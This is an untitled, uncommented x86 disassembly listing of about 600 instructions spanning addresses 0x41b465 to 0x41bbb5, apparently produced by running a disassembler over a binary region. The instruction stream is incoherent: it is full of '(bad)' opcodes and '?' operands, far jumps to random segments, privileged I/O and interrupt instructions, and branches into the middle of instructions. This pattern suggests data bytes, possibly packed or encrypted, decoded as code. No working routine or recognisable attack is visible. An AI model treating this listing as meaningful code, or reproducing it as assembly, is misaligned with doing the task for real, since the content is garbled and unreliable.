  41b465:	jmp    0x26b8:0x16ef01b3
  41b46c:	push   esi
  41b46d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b46e:	xchg   edi,eax
  41b46f:	and    dl,BYTE PTR [edi]
  41b471:	mov    ds:0x919d5bd0,al
  41b476:	mov    bh,0x1f
  41b478:	stc    
  41b479:	mov    esi,ebp
  41b47b:	push   esi
  41b47c:	adc    ebx,ebx
  41b47e:	xor    BYTE PTR [ebx+eiz*2-0x5e1f6e57],bl
  41b485:	mov    DWORD PTR [edx+0x6ba9e05a],0xf828d709
  41b48f:	(bad)  
  41b490:	xchg   edi,eax
  41b491:	mov    eax,ds:0xe3c233c4
  41b496:	mov    DWORD PTR [esi],eax
  41b498:	fcmovb st,st(5)
  41b49a:	and    BYTE PTR [edx],dh
  41b49c:	cmp    ah,BYTE PTR [esp+esi*4]
  41b49f:	sbb    edi,DWORD PTR [ebp-0x118a7a5]
  41b4a5:	cs stc 
  41b4a7:	je     0x41b4db
  41b4a9:	push   ebx
  41b4aa:	pop    esi
  41b4ab:	lods   eax,DWORD PTR ds:[esi]
  41b4ac:	loope  0x41b44a
  41b4ae:	(bad)  
  41b4af:	xchg   edx,eax
  41b4b0:	and    ecx,DWORD PTR [edx-0x740c12d4]
  41b4b6:	bound  edi,QWORD PTR [esi+0x2b7f9111]
  41b4bc:	rcr    bl,0xd3
  41b4bf:	xchg   ebx,eax
  41b4c1:	adc    ch,BYTE PTR ds:0x3606f673
  41b4c7:	jne    0x41b4fe
  41b4c9:	or     BYTE PTR [ebx],dh
  41b4cb:	jb     0x41b46e
  41b4cd:	sbb    ebp,DWORD PTR [edx+esi*4+0x2c]
  41b4d1:	leave  
  41b4d2:	xchg   esi,eax
  41b4d3:	int    0x88
  41b4d5:	iret   
  41b4d6:	lods   eax,DWORD PTR ds:[esi]
  41b4d7:	dec    ecx
  41b4d8:	retf   0x980b
  41b4db:	jae    0x41b474
  41b4dd:	or     bh,BYTE PTR [ebx-0x312b61da]
  41b4e3:	mov    ecx,0xd8294140
  41b4e8:	fimul  WORD PTR [edx]
  41b4ea:	lds    ecx,FWORD PTR [edi-0x30]
  41b4ed:	inc    BYTE PTR [ebx]
  41b4ef:	jmp    0xfd3:0x97e89011
  41b4f6:	ss cli 
  41b4f8:	ja     0x41b4f5
  41b4fa:	inc    ecx
  41b4fb:	push   ebp
  41b4fc:	mov    dl,0x3a
  41b4fe:	ret    
  41b4ff:	cli    
  41b500:	call   0x98785ab9
  41b505:	or     DWORD PTR [ebx-0x25e6c91],0xffffffef
  41b50c:	push   eax
  41b50d:	aam    0xe7
  41b50f:	sbb    edx,DWORD PTR [ebp+0x5d4a0a9b]
  41b515:	or     eax,0x55de565d
  41b51a:	sar    BYTE PTR [edx],1
  41b51c:	pop    ss
  41b51d:	pop    ebp
  41b51e:	nop
  41b51f:	(bad)  
  41b520:	fbstp  TBYTE PTR [eax-0x15f96066]
  41b526:	lods   eax,DWORD PTR ds:[esi]
  41b528:	(bad)  
  41b529:	out    dx,al
  41b52a:	fs inc ebp
  41b52c:	(bad)  
  41b52d:	mov    ah,0x5b
  41b52f:	adc    cl,bl
  41b531:	and    al,0x59
  41b533:	mov    WORD PTR [ecx+0x58],cs
  41b536:	scas   al,BYTE PTR es:[edi]
  41b537:	add    al,0x36
  41b539:	cmp    al,0xee
  41b53b:	lds    eax,FWORD PTR [ecx]
  41b53d:	and    ecx,0xffffffb5
  41b540:	jmp    0x39a1818b
  41b545:	dec    esp
  41b546:	and    ebx,DWORD PTR [edi]
  41b548:	adc    eax,0x49e684ae
  41b54d:	stos   DWORD PTR es:[edi],eax
  41b54e:	mov    dl,0x30
  41b550:	jmp    0x49f4:0xc7220ae6
  41b557:	mov    ?,ebp
  41b559:	scas   al,BYTE PTR es:[edi]
  41b55a:	pop    ds
  41b55b:	inc    esi
  41b55c:	cld    
  41b55d:	(bad)  
  41b55e:	push   ebx
  41b55f:	test   al,0xae
  41b561:	xchg   edx,eax
  41b562:	xor    ch,BYTE PTR [ebx]
  41b564:	je     0x41b54c
  41b566:	lds    edi,FWORD PTR [edi+0x42]
  41b569:	jbe    0x41b5b7
  41b56b:	je     0x41b57e
  41b56d:	iret   
  41b56e:	imul   edi,DWORD PTR [eax-0x6e28763a],0x4f
  41b575:	jns    0x41b5b5
  41b577:	add    edi,esp
  41b579:	sbb    ebp,DWORD PTR [esi+0x477675ee]
  41b57f:	cs imul edi,esi,0x6be147da
  41b586:	mov    ch,0x9c
  41b588:	fmul   DWORD PTR [eax-0x736847a0]
  41b58e:	xchg   edi,eax
  41b58f:	dec    eax
  41b590:	aaa    
  41b591:	aaa    
  41b592:	and    eax,0xc9a3db65
  41b597:	(bad)  
  41b598:	jmp    0xb48fd303
  41b59d:	les    esi,FWORD PTR [ebx]
  41b59f:	pop    eax
  41b5a0:	dec    ebx
  41b5a1:	adc    ch,dh
  41b5a3:	fs rcr esp,1
  41b5a6:	pop    edx
  41b5a7:	(bad)  
  41b5a8:	cdq    
  41b5a9:	mul    DWORD PTR [eax-0xdd47a30]
  41b5af:	mov    ecx,0x5c88688d
  41b5b4:	aaa    
  41b5b5:	dec    ebp
  41b5b6:	std    
  41b5b7:	pop    es
  41b5b8:	clc    
  41b5b9:	bound  ebx,QWORD PTR gs:[esp+esi*8+0x2deb6c0a]
  41b5c1:	cmp    BYTE PTR [esi-0x23],bl
  41b5c4:	xchg   ebx,eax
  41b5c5:	pop    edx
  41b5c6:	mov    ecx,0xfd30794c
  41b5cb:	sbb    eax,0x4b1a5997
  41b5d0:	add    edx,ebp
  41b5d2:	test   BYTE PTR [esi+0x336559a8],ch
  41b5d8:	add    DWORD PTR ds:0x5ac021f3,ecx
  41b5de:	js     0x41b628
  41b5e0:	es push ebx
  41b5e2:	jmp    0x4afce75e
  41b5e7:	push   ss
  41b5e8:	shr    BYTE PTR [ecx+edx*8-0x2c96f655],1
  41b5ef:	and    BYTE PTR [ebp-0x12],bh
  41b5f2:	and    eax,0x821907a9
  41b5f7:	out    0xe9,eax
  41b5f9:	cwde   
  41b5fa:	bound  edi,QWORD PTR [edx-0x2a]
  41b5fd:	inc    esi
  41b5fe:	add    al,0x3d
  41b600:	in     al,0x83
  41b602:	call   0x84de208e
  41b607:	sub    al,0xe3
  41b609:	cld    
  41b60a:	mov    dl,0xdf
  41b60c:	addr16 mov esp,0xc69367b4
  41b612:	sbb    dl,ah
  41b614:	test   eax,0x3e0121d1
  41b619:	outs   dx,DWORD PTR ds:[esi]
  41b61a:	clc    
  41b61b:	or     ecx,eax
  41b61d:	leave  
  41b61e:	mov    WORD PTR [edx-0x176549cb],ds
  41b624:	cmp    BYTE PTR [eax+0x4b392d63],0x3f
  41b62b:	mov    ebx,0x5088340
  41b630:	mov    ds:0x94fca5db,al
  41b635:	push   eax
  41b636:	sbb    al,0xac
  41b638:	mov    ds:0x8f610f23,eax
  41b63d:	sbb    BYTE PTR [esi-0x7],dl
  41b640:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b641:	test   BYTE PTR [edi+0x53],bh
  41b644:	dec    ecx
  41b645:	mov    ebp,0xf6788407
  41b64a:	test   DWORD PTR [esi],esi
  41b64c:	loop   0x41b5e3
  41b64e:	in     al,0xad
  41b650:	mov    BYTE PTR [ebx+edx*4+0x63719464],cl
  41b657:	push   cs
  41b658:	pop    ecx
  41b659:	daa    
  41b65a:	push   ebp
  41b65b:	mov    ds:0xdeb57891,eax
  41b660:	pop    es
  41b661:	cdq    
  41b662:	and    DWORD PTR [esi+0x28],edx
  41b665:	fwait
  41b666:	stc    
  41b667:	retf   0x8f0
  41b66a:	fcomp  DWORD PTR [ebx]
  41b66c:	sub    esp,DWORD PTR [edi+0x62d6e495]
  41b672:	loop   0x41b6d7
  41b674:	push   edx
  41b675:	(bad)  
  41b676:	loopne 0x41b69d
  41b678:	push   ebp
  41b679:	pop    esp
  41b67a:	fimul  WORD PTR [edi]
  41b67c:	(bad)  
  41b67d:	push   edi
  41b67e:	sahf   
  41b67f:	mov    dl,0x26
  41b681:	push   0xfffffff4
  41b683:	or     DWORD PTR [ebp+0x75c628c4],ecx
  41b689:	push   edi
  41b68a:	mov    bh,0x68
  41b68c:	idiv   DWORD PTR ds:0x6987b93e
  41b692:	add    eax,0xd83c2ffc
  41b697:	imul   DWORD PTR [esp+edx*4+0x24]
  41b69b:	jns    0x41b6ca
  41b69d:	mov    edi,DWORD PTR [esi]
  41b69f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6a0:	push   ebx
  41b6a1:	add    cl,BYTE PTR [ebx+ebx*1-0x543a27c2]
  41b6a8:	xchg   edx,eax
  41b6a9:	sbb    DWORD PTR [ecx+0x16],edi
  41b6ac:	jl     0x41b62e
  41b6ae:	cmp    DWORD PTR [ebx-0x43496c44],ebx
  41b6b4:	rcl    DWORD PTR [ecx],cl
  41b6b6:	or     BYTE PTR [ebp-0x37463c04],bl
  41b6bc:	call   0xc05b8be3
  41b6c1:	lods   eax,DWORD PTR ds:[esi]
  41b6c2:	arpl   WORD PTR [ecx+0x69],dx
  41b6c5:	jp     0x41b689
  41b6c7:	adc    ch,BYTE PTR [edx+0x776bc708]
  41b6cd:	les    ebx,FWORD PTR [ecx+0x70]
  41b6d0:	das    
  41b6d1:	adc    al,0xbc
  41b6d3:	mov    ah,cl
  41b6d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6d6:	mov    esp,0xa31d7ea7
  41b6db:	int    0xca
  41b6dd:	dec    esi
  41b6de:	sub    BYTE PTR [ebx-0x27bd74],0x9
  41b6e5:	scas   al,BYTE PTR es:[edi]
  41b6e6:	xchg   ebx,eax
  41b6e7:	fmul   DWORD PTR [ecx-0x5dad8d9d]
  41b6ed:	lods   al,BYTE PTR ds:[esi]
  41b6ee:	add    BYTE PTR [bx+si+0x65],al
  41b6f2:	inc    ebp
  41b6f3:	adc    bl,BYTE PTR [ecx+ebx*4+0x281698c8]
  41b6fa:	inc    edi
  41b6fb:	les    edi,FWORD PTR [eax-0x67]
  41b6fe:	sbb    esi,DWORD PTR [eax+0xc]
  41b701:	and    BYTE PTR [ecx+0x350f6e32],al
  41b707:	(bad)  
  41b708:	jo     0x41b6f7
  41b70a:	push   es
  41b70b:	pop    ebx
  41b70c:	jecxz  0x41b6d8
  41b70e:	and    al,0x0
  41b710:	jp     0x41b6f7
  41b712:	std    
  41b713:	in     eax,0x5f
  41b715:	(bad)  
  41b716:	cwde   
  41b717:	sti    
  41b718:	fstp   DWORD PTR [ecx+ebp*2]
  41b71b:	sbb    esp,DWORD PTR [edx+eax*4]
  41b71e:	mov    ch,0x27
  41b720:	loop   0x41b6c9
  41b722:	adc    esi,DWORD PTR [edx-0x33f2761c]
  41b728:	mov    ecx,0x8474ad0c
  41b72d:	call   0x9c811671
  41b732:	push   0x7a40ba5f
  41b737:	xor    eax,DWORD PTR [eax]
  41b739:	call   0xff2a7d55
  41b73e:	sbb    DWORD PTR [edi+0x2c],0x2223fcac
  41b745:	hlt    
  41b746:	(bad)  [esi+0x60ee07d0]
  41b74c:	rcr    DWORD PTR [ecx],0x0
  41b74f:	cmp    ebp,0xffffff93
  41b752:	xor    ecx,esp
  41b754:	gs jno 0x41b77c
  41b757:	stc    
  41b758:	xchg   esi,eax
  41b759:	xor    bl,dh
  41b75b:	push   ds
  41b75c:	push   edi
  41b75d:	push   ebp
  41b75e:	inc    edx
  41b75f:	inc    ebp
  41b760:	outs   dx,BYTE PTR ds:[esi]
  41b761:	pushf  
  41b762:	cs jb  0x41b7d2
  41b765:	xchg   ebp,eax
  41b766:	fld    DWORD PTR [ebx+0x8]
  41b769:	pop    esi
  41b76a:	mov    edx,0x34b3069b
  41b76f:	inc    esp
  41b770:	retf   0x604
  41b773:	mov    dl,0x89
  41b775:	nop
  41b776:	ja     0x41b723
  41b778:	jae    0x41b7bd
  41b77a:	inc    esp
  41b77b:	pop    eax
  41b77c:	popa   
  41b77d:	cmp    BYTE PTR [edx],dh
  41b77f:	sub    bl,BYTE PTR [edx-0x43]
  41b782:	sbb    DWORD PTR [edi-0x5],edi
  41b785:	or     esp,ebx
  41b787:	adc    dl,dl
  41b789:	ins    DWORD PTR es:[edi],dx
  41b78a:	xchg   ebx,eax
  41b78b:	out    dx,al
  41b78c:	inc    eax
  41b78d:	pop    ebp
  41b78e:	mov    esp,0xe0fbe273
  41b793:	xchg   BYTE PTR [edi+0x3ab021be],dl
  41b799:	jae    0x41b7a7
  41b79b:	cli    
  41b79c:	pop    ss
  41b79d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b79e:	and    edi,DWORD PTR [ebp+0x48]
  41b7a1:	out    0xb4,eax
  41b7a3:	(bad)  
  41b7a4:	pop    ebx
  41b7a5:	cmp    ebp,DWORD PTR [esi-0x52]
  41b7a8:	mov    BYTE PTR [ebx],dl
  41b7aa:	sub    al,0xb4
  41b7ac:	mov    esi,0x760e7e5
  41b7b1:	out    0x6c,eax
  41b7b3:	cmp    al,0xd0
  41b7b5:	stc    
  41b7b6:	sbb    al,0x17
  41b7b8:	cli    
  41b7b9:	gs pop edi
  41b7bb:	aad    0xe3
  41b7bd:	dec    ebx
  41b7be:	cmp    BYTE PTR [edx-0xe],cl
  41b7c1:	jnp    0x41b7f1
  41b7c3:	push   cs
  41b7c4:	ja     0x41b832
  41b7c6:	sub    BYTE PTR [eax+0x7907a0ed],bh
  41b7cc:	xchg   esi,eax
  41b7cd:	outs   dx,BYTE PTR ds:[esi]
  41b7ce:	aam    0xd8
  41b7d0:	mov    WORD PTR [edi+0x40],es
  41b7d3:	sub    dh,BYTE PTR [ebx]
  41b7d5:	inc    ebp
  41b7d6:	adc    bl,BYTE PTR [ebx+ebp*8-0x3a]
  41b7da:	sub    eax,DWORD PTR [esp+edi*4+0x7c]
  41b7de:	jmp    0x1527f3e
  41b7e3:	cmp    BYTE PTR [ecx],0xa7
  41b7e6:	add    DWORD PTR [ebx],ebx
  41b7e8:	(bad)  
  41b7e9:	bound  edi,QWORD PTR [esi+0xa52b3ef]
  41b7ef:	clc    
  41b7f0:	bound  esi,QWORD PTR [edi]
  41b7f2:	mul    BYTE PTR [ebx-0x3b33cba6]
  41b7f8:	pusha  
  41b7f9:	push   ss
  41b7fa:	ret    0x9895
  41b7fd:	jbe    0x41b86f
  41b7ff:	ins    DWORD PTR es:[edi],dx
  41b800:	dec    edx
  41b801:	aas    
  41b802:	xchg   cl,ah
  41b804:	jo     0x41b798
  41b806:	popf   
  41b807:	jb     0x41b835
  41b809:	xor    ah,BYTE PTR [ebp-0x7c9ba2df]
  41b80f:	inc    ecx
  41b810:	mov    eax,0x85600e48
  41b815:	test   eax,0xb20590dd
  41b81a:	jge    0x41b86b
  41b81c:	inc    eax
  41b81d:	jns    0x41b840
  41b81f:	push   esp
  41b820:	cld    
  41b821:	dec    esi
  41b822:	fsubp  st(2),st
  41b824:	aam    0x22
  41b826:	push   ss
  41b827:	out    dx,al
  41b828:	pop    esi
  41b829:	adc    eax,0xb1b3f10a
  41b82e:	scas   al,BYTE PTR es:[edi]
  41b82f:	sub    al,0xe4
  41b831:	mov    ebx,0xdbd99cfe
  41b836:	dec    esi
  41b837:	retf   
  41b838:	imul   esp,DWORD PTR [edi+eiz*8-0x67a1e4e4],0xffffffae
  41b840:	pusha  
  41b841:	fidivr WORD PTR [esi]
  41b843:	inc    esp
  41b844:	push   edi
  41b845:	je     0x41b7d4
  41b847:	mov    ah,0x1d
  41b849:	mov    dh,dh
  41b84b:	imul   edi,edi,0xffffff81
  41b84e:	fdiv   DWORD PTR [eax]
  41b850:	arpl   WORD PTR [edx+0x35],bx
  41b853:	xlat   BYTE PTR ds:[ebx]
  41b854:	hlt    
  41b855:	push   es
  41b856:	sbb    esp,ebx
  41b858:	mov    ds,WORD PTR [eax-0x183a420]
  41b85e:	fs (bad) 
  41b860:	xchg   ebp,eax
  41b861:	sbb    BYTE PTR [ebx+eiz*1+0x2d],0x19
  41b866:	mov    bh,ch
  41b868:	mov    ch,0xfa
  41b86a:	call   0x206:0x724c6690
  41b871:	and    ch,BYTE PTR [ebp*8-0x11c53315]
  41b878:	cmp    edi,edx
  41b87a:	fisubr DWORD PTR [ecx]
  41b87c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b87d:	ja     0x41b814
  41b87f:	daa    
  41b880:	sbb    esp,esp
  41b882:	scas   eax,DWORD PTR es:[edi]
  41b883:	mov    ch,al
  41b885:	jmp    0x90905baf
  41b88a:	sar    DWORD PTR ds:0x264e38d4,1
  41b890:	mov    ch,BYTE PTR [edi+0x51]
  41b893:	jle    0x41b8cf
  41b895:	inc    ebx
  41b896:	xlat   BYTE PTR ds:[ebx]
  41b897:	div    BYTE PTR [edi]
  41b899:	push   esp
  41b89a:	clc    
  41b89b:	sub    al,BYTE PTR [ecx]
  41b89d:	sub    BYTE PTR [eax+0x42],0x10
  41b8a1:	(bad)  
  41b8a2:	pop    edx
  41b8a3:	inc    ebp
  41b8a4:	xchg   esp,eax
  41b8a5:	push   ecx
  41b8a6:	pop    eax
  41b8a7:	sub    al,0xc
  41b8a9:	and    eax,0x730a6554
  41b8ae:	call   FWORD PTR [ecx]
  41b8b0:	ret    
  41b8b1:	jl     0x41b848
  41b8b3:	pop    edi
  41b8b4:	xchg   ecx,eax
  41b8b5:	inc    eax
  41b8b6:	loope  0x41b8e0
  41b8b8:	mov    eax,0x3c8f83fc
  41b8bd:	mov    eax,0x6cf87e45
  41b8c2:	sub    eax,0x1d5383b9
  41b8c7:	mov    cl,0x97
  41b8c9:	pusha  
  41b8ca:	jb     0x41b8f0
  41b8cc:	inc    eax
  41b8cd:	sub    edx,DWORD PTR [ebp+0x1b]
  41b8d0:	outs   dx,BYTE PTR ds:[esi]
  41b8d1:	loope  0x41b869
  41b8d3:	fimul  WORD PTR [ebx-0x52cbc688]
  41b8d9:	int    0x6a
  41b8db:	push   ebx
  41b8dc:	jnp    0x41b95b
  41b8de:	and    eax,0xd8841dd5
  41b8e3:	jns    0x41b8f8
  41b8e5:	inc    esi
  41b8e6:	jnp    0x41b92d
  41b8e8:	jo     0x41b89b
  41b8ea:	cmc    
  41b8eb:	inc    ecx
  41b8ec:	pop    es
  41b8ed:	mov    al,0x5b
  41b8ef:	xor    eax,0x3fb7508c
  41b8f4:	pop    ecx
  41b8f5:	sub    al,0x6c
  41b8f7:	(bad)  
  41b8f8:	cmp    al,0x48
  41b8fa:	mov    cl,0xaa
  41b8fc:	test   BYTE PTR [ebx-0x64],cl
  41b8ff:	ss out dx,eax
  41b901:	call   0xa1a6:0x365e64d6
  41b908:	mov    ds:0x115a13c4,al
  41b90d:	enter  0x88ed,0x8e
  41b911:	push   0x42e6720f
  41b916:	xor    ebp,DWORD PTR [ecx+0xa]
  41b919:	or     eax,0xbff7c269
  41b91e:	fcmovne st,st(2)
  41b920:	or     al,0x76
  41b922:	mov    eax,ebx
  41b924:	jle    0x41b959
  41b926:	dec    eax
  41b927:	fwait
  41b928:	mov    al,0x3d
  41b92a:	cs mov dh,0x24
  41b92d:	cmp    DWORD PTR [ebx-0x24],ebx
  41b930:	lea    esp,[eax]
  41b932:	mov    fs,WORD PTR [edi-0x7f12a942]
  41b938:	test   BYTE PTR [ecx+0x3569c878],bh
  41b93e:	call   FWORD PTR [ebx]
  41b940:	rep stos DWORD PTR es:[edi],eax
  41b942:	dec    esp
  41b943:	out    dx,eax
  41b944:	adc    al,0x5e
  41b946:	or     eax,0xe08e325b
  41b94b:	fs iret 
  41b94d:	xor    dh,BYTE PTR [edi]
  41b94f:	outs   dx,BYTE PTR ds:[esi]
  41b950:	add    ah,BYTE PTR ds:0x454c9ec1
  41b956:	push   ebp
  41b957:	retf   0x7f77
  41b95a:	arpl   WORD PTR [eax-0x75a08b21],dx
  41b960:	test   esp,0x489af972
  41b966:	dec    eax
  41b967:	inc    esp
  41b968:	and    DWORD PTR [ebx+0x78cd1b5f],edx
  41b96e:	enter  0x92b1,0xd7
  41b972:	sbb    bl,al
  41b974:	jl     0x41b8fe
  41b976:	std    
  41b977:	inc    esp
  41b978:	xchg   ecx,eax
  41b979:	cmp    al,0xce
  41b97b:	mov    bh,0x8f
  41b97d:	fisub  WORD PTR [ebx-0x5028fb2f]
  41b983:	out    dx,eax
  41b984:	xchg   DWORD PTR [ecx+0x37a00218],edi
  41b98a:	imul   edi,DWORD PTR [esi],0xffffffe9
  41b98d:	cmp    bl,0x5f
  41b990:	push   cx
  41b992:	das    
  41b993:	dec    edx
  41b994:	sub    al,0x7c
  41b996:	out    dx,eax
  41b997:	mov    dl,0x59
  41b999:	cli    
  41b99a:	push   0xffffff8d
  41b99c:	scas   al,BYTE PTR es:[edi]
  41b99d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b99e:	inc    edx
  41b99f:	aam    0x31
  41b9a1:	sbb    ch,BYTE PTR [eax-0x5323e958]
  41b9a7:	push   es
  41b9a8:	mov    ds:0x39ff4cf3,eax
  41b9ad:	xchg   ebx,eax
  41b9ae:	inc    esp
  41b9af:	or     eax,0xa399d1e8
  41b9b4:	gs inc esi
  41b9b6:	(bad)  
  41b9b7:	shl    DWORD PTR es:[eax+0x373cc347],cl
  41b9be:	test   ebx,edi
  41b9c0:	cmp    al,0x70
  41b9c2:	mov    dh,0xe8
  41b9c4:	bound  esi,QWORD PTR [ecx]
  41b9c6:	cli    
  41b9c7:	out    0xfc,al
  41b9c9:	and    al,bl
  41b9cb:	clc    
  41b9cc:	retf   0x9ae7
  41b9cf:	dec    esi
  41b9d0:	scas   eax,DWORD PTR es:[edi]
  41b9d1:	fwait
  41b9d2:	inc    ebx
  41b9d3:	mov    ah,0x63
  41b9d5:	out    dx,eax
  41b9d6:	not    BYTE PTR [eax-0x5e53bb79]
  41b9dc:	pop    es
  41b9dd:	pusha  
  41b9de:	(bad)  
  41b9df:	pop    ecx
  41b9e0:	neg    BYTE PTR ds:0x88099295
  41b9e6:	dec    edi
  41b9e7:	or     al,BYTE PTR [ecx+0x40]
  41b9ea:	pop    ecx
  41b9eb:	and    DWORD PTR [eax-0x7a],0x977ce74a
  41b9f2:	sub    bl,BYTE PTR [edx]
  41b9f4:	xchg   ebp,eax
  41b9f5:	inc    ebx
  41b9f6:	sbb    esi,DWORD PTR [ecx]
  41b9f8:	xchg   BYTE PTR [esi],dh
  41b9fa:	push   esp
  41b9fb:	pop    ds
  41b9fc:	mov    cl,0xe5
  41b9fe:	lods   eax,DWORD PTR ds:[esi]
  41b9ff:	mov    edx,0x1048226e
  41ba04:	pop    es
  41ba05:	pop    edx
  41ba06:	aam    0x44
  41ba08:	lds    esp,FWORD PTR [ebx+0x7b]
  41ba0b:	mov    WORD PTR [ebx-0x3d],?
  41ba0e:	jmp    0x4f8807
  41ba13:	cmp    dh,BYTE PTR [edx]
  41ba15:	pop    esi
  41ba16:	xor    DWORD PTR [edx-0x24],eax
  41ba19:	scas   eax,DWORD PTR es:[edi]
  41ba1a:	cdq    
  41ba1b:	dec    esp
  41ba1c:	sbb    BYTE PTR [eax],al
  41ba1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba1f:	fwait
  41ba20:	cs adc eax,0xc0bf
  41ba26:	pop    es
  41ba27:	jno    0x41b9fc
  41ba29:	jae    0x41ba67
  41ba2b:	add    BYTE PTR [edx],ch
  41ba2d:	out    0xc1,al
  41ba2f:	mov    cl,0xdb
  41ba31:	mov    al,0xa0
  41ba33:	int3   
  41ba34:	mov    eax,ds:0xc7a1472b
  41ba39:	ds xchg edi,eax
  41ba3b:	retf   0x7cd
  41ba3e:	ret    0x9109
  41ba41:	xchg   edx,eax
  41ba42:	mov    dh,0x76
  41ba44:	sub    bh,BYTE PTR [edx]
  41ba46:	push   ebx
  41ba47:	push   esp
  41ba48:	nop
  41ba49:	mov    edx,0x9b8edc9a
  41ba4e:	rcl    DWORD PTR [edx+0x291bc788],0xa6
  41ba55:	loop   0x41ba90
  41ba57:	mov    esp,0x75403527
  41ba5c:	and    bh,ah
  41ba5e:	les    ecx,FWORD PTR [edx-0x21dec323]
  41ba64:	or     DWORD PTR [ecx+0x67],0xffffffc5
  41ba68:	pop    ss
  41ba69:	dec    eax
  41ba6a:	mov    ah,0xe
  41ba6c:	pop    esp
  41ba6d:	jp     0x41ba8a
  41ba6f:	stc    
  41ba70:	pop    ss
  41ba71:	pop    eax
  41ba72:	xchg   BYTE PTR [ebx+0x48],bl
  41ba75:	cwde   
  41ba76:	xchg   BYTE PTR ds:0xad074882,cl
  41ba7c:	inc    esp
  41ba7d:	xor    edi,DWORD PTR [esi]
  41ba7f:	xor    eax,0xb634cb04
  41ba84:	mov    al,0x65
  41ba86:	mov    esp,0x878eaa7c
  41ba8b:	and    eax,DWORD PTR [esi+esi*4]
  41ba8e:	dec    esi
  41ba8f:	inc    ebp
  41ba90:	lods   al,BYTE PTR ds:[esi]
  41ba91:	shl    BYTE PTR [ebx],cl
  41ba93:	je     0x41bb12
  41ba95:	ins    DWORD PTR es:[edi],dx
  41ba96:	xor    al,0xe6
  41ba98:	out    0x23,al
  41ba9a:	sub    al,al
  41ba9c:	xchg   DWORD PTR [ecx],edi
  41ba9e:	pop    eax
  41ba9f:	push   esi
  41baa0:	dec    eax
  41baa1:	xor    BYTE PTR [ecx+0x65],al
  41baa4:	rcl    DWORD PTR [ebp-0x126c015],0x73
  41baab:	adc    eax,0x690f5845
  41bab0:	jmp    0xcfc2:0x66eac78a
  41bab7:	bound  ecx,QWORD PTR [esi+0x72]
  41baba:	out    0x74,al
  41babc:	inc    ebp
  41babd:	cmp    DWORD PTR [ebx-0x6036806d],0xffffffa6
  41bac4:	cmp    al,0xcf
  41bac6:	jae    0x41ba62
  41bac8:	jecxz  0x41bb1d
  41baca:	repz xor eax,0x534ff358
  41bad0:	adc    BYTE PTR [ebp-0x26],ah
  41bad3:	aaa    
  41bad4:	mov    edx,0x392eccb9
  41bad9:	mov    ah,0x8
  41badb:	mov    bh,0x13
  41badd:	lods   al,BYTE PTR ds:[esi]
  41bade:	lods   eax,DWORD PTR ds:[esi]
  41badf:	mov    ch,bl
  41bae1:	dec    esp
  41bae2:	jnp    0x41baa4
  41bae4:	out    dx,eax
  41bae5:	inc    edi
  41bae6:	or     eax,0x39a4c8e8
  41baeb:	clc    
  41baec:	dec    edi
  41baed:	mov    ebx,0x512b715
  41baf2:	pushf  
  41baf3:	lea    ebx,[ebx]
  41baf5:	dec    ecx
  41baf6:	(bad)
  41baf9:	test   BYTE PTR [ebx],bh
  41bafb:	lock or al,0x8a
  41bafe:	dec    esp
  41baff:	out    0xaf,eax
  41bb01:	call   0x272cd1ea
  41bb06:	cs push cs
  41bb08:	aaa    
  41bb09:	push   ebx
  41bb0a:	cld    
  41bb0b:	adc    ebp,DWORD PTR [esp+edx*4]
  41bb0e:	in     al,dx
  41bb0f:	jb     0x41bada
  41bb11:	into   
  41bb12:	push   eax
  41bb13:	and    al,0x73
  41bb15:	pop    edx
  41bb16:	outs   dx,DWORD PTR ds:[esi]
  41bb17:	fisubr WORD PTR [ebx]
  41bb19:	enter  0x90b1,0x5f
  41bb1d:	inc    esi
  41bb1e:	jmp    0x41bace
  41bb20:	outs   dx,DWORD PTR ds:[esi]
  41bb21:	or     BYTE PTR [esi],ah
  41bb23:	ins    BYTE PTR es:[edi],dx
  41bb24:	add    ch,BYTE PTR [esi-0x196017fe]
  41bb2a:	push   ss
  41bb2b:	jbe    0x41badb
  41bb2d:	retf   
  41bb2e:	push   eax
  41bb2f:	jne    0x41bb2e
  41bb31:	outs   dx,BYTE PTR ds:[esi]
  41bb32:	xchg   edx,ebp
  41bb34:	dec    esi
  41bb35:	adc    eax,0x9d7e9819
  41bb3a:	lahf   
  41bb3b:	cmp    al,0xca
  41bb3d:	xchg   edx,eax
  41bb3e:	or     DWORD PTR ds:0xa7f97395,eax
  41bb44:	test   BYTE PTR [edx-0x77e5c1ac],bh
  41bb4a:	repnz in al,dx
  41bb4c:	mov    ds:0x7a0f1e1f,eax
  41bb51:	cmp    ecx,DWORD PTR [eax+ebp*4]
  41bb54:	leave  
  41bb55:	ret    
  41bb56:	leave  
  41bb57:	out    0xec,al
  41bb59:	lock fstp TBYTE PTR [edx]
  41bb5c:	inc    esp
  41bb5d:	jb     0x41bbc4
  41bb5f:	mov    bh,0xe8
  41bb61:	cwde   
  41bb62:	jmp    FWORD PTR [ebp-0x5b]
  41bb65:	lea    edi,[esi+ebx*8]
  41bb68:	add    ebp,DWORD PTR ds:0xea2752c7
  41bb6e:	(bad)  
  41bb70:	imul   esp,DWORD PTR [ecx-0x6b],0xffffff96
  41bb74:	loope  0x41bbd2
  41bb76:	es push 0xfffffff9
  41bb79:	xor    esi,ebx
  41bb7b:	popf   
  41bb7c:	xchg   BYTE PTR [edx+0x26521da0],bh
  41bb82:	pop    ds
  41bb83:	test   al,0x32
  41bb85:	mov    eax,0x912280a4
  41bb8a:	adc    al,0xea
  41bb8c:	xchg   edi,ebx
  41bb8e:	sub    al,0xb2
  41bb90:	adc    ah,dh
  41bb92:	cmp    BYTE PTR [edi+0x1d439113],cl
  41bb98:	dec    ecx
  41bb99:	push   ecx
  41bb9a:	mov    ds,WORD PTR [ebp+0x778dd369]
  41bba0:	enter  0x9ba8,0x76
  41bba4:	push   esi
  41bba5:	add    edx,DWORD PTR [eax-0x268f2479]
  41bbab:	lahf   
  41bbac:	fidiv  WORD PTR [ecx-0x71]
  41bbaf:	xchg   BYTE PTR [ebp-0x2b],dl
  41bbb2:	sbb    esp,DWORD PTR [esi-0xb]
  41bbb5:	sub    BYTE PTR [edi+0x6a],bh
